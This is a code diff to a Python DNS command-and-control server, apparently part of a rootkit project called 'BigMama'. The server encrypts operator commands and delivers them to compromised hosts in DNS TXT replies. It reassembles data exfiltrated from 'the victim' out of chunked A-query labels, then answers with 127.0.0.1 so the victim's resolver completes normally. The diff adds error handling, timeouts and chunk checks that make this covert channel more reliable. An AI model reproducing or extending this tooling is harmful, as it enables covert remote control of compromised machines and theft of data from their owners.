@@ -19,7 +19,7 @@ class DNSSender:
         self.expected_chunks = None 
 
         self.owner = owner
-        self._running = False    
+        self._running = False
 
         self._server = None
         self._thread = None
@@ -70,24 +70,56 @@ class DNSSender:
         print("[DNS] Server stopped.")
 
     def send(self, message: str) -> str:
+        if (len(self.exfil_buffer) > 0):
+            msg = "[DNS] Cannot send new command. Please wait for the previous command to complete."
+            self.owner._command_history.append(
+                {"command": message, 
+                 "stdout": "", 
+                 "stderr": msg, 
+                 "termination_code": "Undefined"})
+            return msg
+        
+        if (len(message) == 0): 
+            msg = "[DNS] Empty message, nothing to send."
+            print(msg)
+            return msg
+       
+        # Encrypt the message using AES-CBC
+        message_encrypted = self._crypto.encrypt(message)
+
+        if (len(message_encrypted) >= 255):
+            msg = "[DNS] Message too long to send via DNS (max 255 char)."
+            self.owner._command_history.append(
+                {"command": message, 
+                 "stdout": "", 
+                 "stderr": msg, 
+                 "termination_code": "Undefined"})
+            return msg
 
         # Push into global queue
-        self.command_queue.append(self._crypto.encrypt(message))
+        self.command_queue.append(message_encrypted)
 
         # Poll‐assemble-decrypt.
         raw = self.assemble_exfil()
-        print(f"[DNS] Received raw response: {raw}")
-        raw_decrypted = self._crypto.decrypt(raw)
-        print(f"[DNS] Decrypted response: {raw_decrypted}")
-        
-        # Update in BigMama
-        if self.owner is not None:
-            if hasattr(self.owner, "_check_rootkit_command"):
-                self.owner._check_rootkit_command(raw_decrypted)
-            if hasattr(self.owner, "_update_command_history"):
-                self.owner._update_command_history(raw_decrypted)
+        if raw is None:
+            msg = "[DNS] Timeout while waiting for all chunks. Returning empty data."
+            self.owner._command_history.append(
+                {"command": message, 
+                 "stdout": "", 
+                 "stderr": msg, 
+                 "termination_code": "Undefined"})
+            return msg
 
-        # Return the raw response
+        # Decrypt the received data
+        raw_decrypted = self._crypto.decrypt(raw)
+        print(f"[DNS] Decrypted received response: {raw_decrypted}")
+        
+        # Update in BigMama attributes
+        self.owner._command_history.append({"command": message, "stdout": "", "stderr": "", "termination_code": "Undefined"})
+        self.owner._check_rootkit_command(raw_decrypted)
+        self.owner._update_command_history(raw_decrypted)
+
+        # Return the response
         return raw_decrypted
     
     def assemble_exfil(self, timeout=cfg.DNS_RESPONSE_TIMEOUT, poll=cfg.DNS_POLL_INTERVAL) -> str:
@@ -116,6 +148,11 @@ class DNSSender:
         data = b""
         if self.expected_chunks is not None and len(self.exfil_buffer) >= self.expected_chunks:
             data = b''.join(self.exfil_buffer[i] for i in range(self.expected_chunks))
+        else:
+            print("[DNS] Timeout while waiting for all chunks. Returning empty data.")
+            self.expected_chunks = None
+            self.exfil_buffer.clear()
+            return None
 
         # Reset buffers
         self.expected_chunks = None
@@ -132,12 +169,10 @@ class DNSSender:
         def handle(self):
             """
             This nested class is used by the ThreadingUDPServer. On each DNS packet:
-
             - If it's a TXT-query for "command.<cfg.DNS_DOMAIN>", pop the next command
             from self.server.sender.command_queue, wrap it in a TXT RR, and send it back.
-
-            - If it's an A-query with label "<seq>/<tot>-<hexchunk>", decode the chunk into
-            bytes, store it in self.server.sender.exfil_buffer[seq], set
+            - If it's an A-query with label <seq>/<tot>-<chunk>.command.<cfg.DNS_DOMAIN>, 
+            decode the chunk, store it in self.server.sender.exfil_buffer[seq], set
             self.server.sender.expected_chunks = tot (if not already set), then reply
             with A=127.0.0.1 so the victim's resolver completes normally.
             """
@@ -186,10 +221,7 @@ class DNSSender:
                     )
 
                 # Sends response
-                try:
-                    if (cmd != ""):
-                        print(f"[DNS] Sending command: {cmd!r}.")
-                    sock.sendto(reply.pack(), self.client_address)
+                try: sock.sendto(reply.pack(), self.client_address)
                 except Exception as e:
                     print(f"[DNS] Failed to send TXT reply: {e}.")
                 return
@@ -223,8 +255,12 @@ class DNSSender:
                         sender.exfil_buffer[seq] = chunk
 
                         # On the very first chunk, record how many chunks we expect
+                        # Additionally, if the expected_chunks is already set,
+                        # check if it matches the total number of chunks.
                         if sender.expected_chunks is None:
                             sender.expected_chunks = tot
+                        elif sender.expected_chunks != tot:
+                            print("[DNS] Warning: Expected chunks count mismatch! ")
 
                         # Debug
                         print(f"[DNS] Got chunk {seq}/{tot}")
@@ -233,4 +269,6 @@ class DNSSender:
 
                 # Always send back a harmless A-record (127.0.0.1) so the client’s DNS call completes
                 reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=0))
+
+                # Send the reply back to the client
                 sock.sendto(reply.pack(), self.client_address)
